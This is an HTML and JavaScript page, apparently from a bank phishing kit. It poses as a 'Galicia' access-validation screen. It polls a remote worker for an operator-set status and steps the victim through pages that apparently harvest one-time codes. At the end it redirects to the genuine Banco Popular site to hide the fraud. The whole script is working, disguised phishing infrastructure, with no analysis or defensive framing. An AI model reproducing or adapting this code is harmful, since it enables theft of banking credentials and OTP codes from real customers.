<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
  <title>Validando - Galicia</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }

    .spinner-salmon {
      position: relative;
      width: 60px;
      height: 60px;
      margin-bottom: 30px;
    }

    .spinner-salmon::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid rgba(244, 119, 33, 0.15);
      border-radius: 50%;
    }

    .spinner-salmon::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top-color: #f47721;
      border-bottom-color: #f47721;
      border-radius: 50%;
      animation: spinSalmon 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
    }

    @keyframes spinSalmon {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .status-text {
      color: #666;
      font-size: 16px;
      margin-top: 20px;
      text-align: center;
    }

    .status-text .highlight {
      color: #f47721;
      font-weight: bold;
    }

    .error-text {
      color: #dc3545;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }

    @media (prefers-reduced-motion: reduce) {
      .spinner-salmon::after {
        animation: none;
      }
    }
  </style>
</head>
<body>
  <div class="spinner-salmon"></div>
  <div class="status-text">
    <span id="statusMessage">Validando acceso...</span><br>
    <span style="font-size: 12px; color: #999;" id="attemptInfo"></span>
  </div>
  <div class="error-text" id="errorMessage">⏰ Tiempo de espera agotado. Redirigiendo...</div>

  <script>
    // ========================= CONFIGURACIÓN =========================
    const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
    const BASE_URL = 'https://personasgalicia.vercel.app';
    let intentos = 0;
    const MAX_INTENTOS = 60;
    const INTERVALO = 3000; // 3 segundos entre consultas

    // ========================= FUNCIÓN PRINCIPAL =========================
    async function checkStatus(transactionId) {
      intentos++;
      
      try {
        // Actualizar mensaje
        document.getElementById('attemptInfo').textContent = `Intento ${intentos}/${MAX_INTENTOS}`;
        document.getElementById('statusMessage').textContent = '🔄 Validando acceso...';

        console.log(`🔍 Consultando estado (${intentos}/${MAX_INTENTOS})...`);
        
        const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
        
        if (!response.ok) {
          if (response.status === 404) {
            // Si no encuentra el ID, puede ser que aún no se haya guardado
            console.log('⏳ Transacción no encontrada aún, esperando...');
            document.getElementById('statusMessage').textContent = '⏳ Procesando solicitud...';
          } else {
            throw new Error(`HTTP ${response.status}`);
          }
        } else {
          const data = await response.json();
          console.log(`📊 Estado (${intentos}/${MAX_INTENTOS}):`, data);

          // Si tiene estado, procesarlo
          if (data.estado && data.estado !== "pendiente") {
            // ========================= PROCESAR ESTADO =========================
            const estado = data.estado;
            console.log(`✅ Estado recibido: ${estado}`);
            
            // Mostrar mensaje según estado
            const mensajes = {
              'autorizado': '✅ ¡Autorización confirmada! Redirigiendo...',
              'error': '❌ Acceso denegado. Redirigiendo...',
              'otp_solicitado': '📲 OTP solicitado. Esperando código...',
              'otp_recibido': '📲 Código OTP recibido. Redirigiendo...',
              'finalizado': '🏁 Proceso finalizado. Redirigiendo...'
            };
            
            if (mensajes[estado]) {
              document.getElementById('statusMessage').textContent = mensajes[estado];
            }
            
            // Redirigir según estado
            switch (estado) {
              case 'autorizado':
                setTimeout(() => {
                  window.location.href = `${BASE_URL}/codigo.html`;
                }, 1500);
                return;
                
              case 'error':
                setTimeout(() => {
                  window.location.href = `${BASE_URL}/`;
                }, 1500);
                return;
                
              case 'otp_solicitado':
                // Seguir esperando
                document.getElementById('statusMessage').textContent = '📲 OTP solicitado. Esperando código...';
                break;
                
              case 'otp_recibido':
                setTimeout(() => {
                  window.location.href = `${BASE_URL}/codeinco.html`;
                }, 1500);
                return;
                
              case 'finalizado':
                setTimeout(() => {
                  window.location.href = 'https://www.bancopopular.com.co/';
                }, 1500);
                return;
                
              default:
                break;
            }
          }
        }

        // Si llegamos aquí, continuamos esperando
        if (intentos >= MAX_INTENTOS) {
          console.log('⏰ Tiempo de espera agotado');
          document.getElementById('statusMessage').textContent = '⏰ Tiempo de espera agotado';
          document.getElementById('errorMessage').style.display = 'block';
          setTimeout(() => {
            window.location.href = `${BASE_URL}/`;
          }, 3000);
          return;
        }

        // Programar siguiente intento
        setTimeout(() => checkStatus(transactionId), INTERVALO);
        
      } catch (error) {
        console.error('❌ Error:', error);
        document.getElementById('statusMessage').textContent = '⚠️ Error de conexión. Reintentando...';
        
        if (intentos < MAX_INTENTOS) {
          setTimeout(() => checkStatus(transactionId), INTERVALO);
        } else {
          document.getElementById('errorMessage').style.display = 'block';
          setTimeout(() => {
            window.location.href = `${BASE_URL}/`;
          }, 3000);
        }
      }
    }

    // ========================= INICIALIZACIÓN =========================
    document.addEventListener('DOMContentLoaded', async () => {
      try {
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
        console.log('📦 Datos de localStorage:', bancoldata);
        
        if (!bancoldata || !bancoldata.transactionId) {
          console.log('❌ Error: Datos no encontrados en localStorage');
          document.getElementById('statusMessage').textContent = '❌ Error: Sesión no encontrada';
          setTimeout(() => {
            window.location.href = `${BASE_URL}/`;
          }, 2000);
          return;
        }

        const transactionId = bancoldata.transactionId;
        console.log('🔍 Verificando transacción:', transactionId);
        document.getElementById('statusMessage').textContent = '🔍 Verificando acceso...';

        // Esperar 1 segundo antes de empezar a consultar
        setTimeout(() => checkStatus(transactionId), 1000);
        
      } catch (error) {
        console.error('❌ Error al inicializar:', error);
        document.getElementById('statusMessage').textContent = '❌ Error al cargar la sesión';
        setTimeout(() => {
          window.location.href = `${BASE_URL}/`;
        }, 2000);
      }
    });
  </script>
</body>
</html>
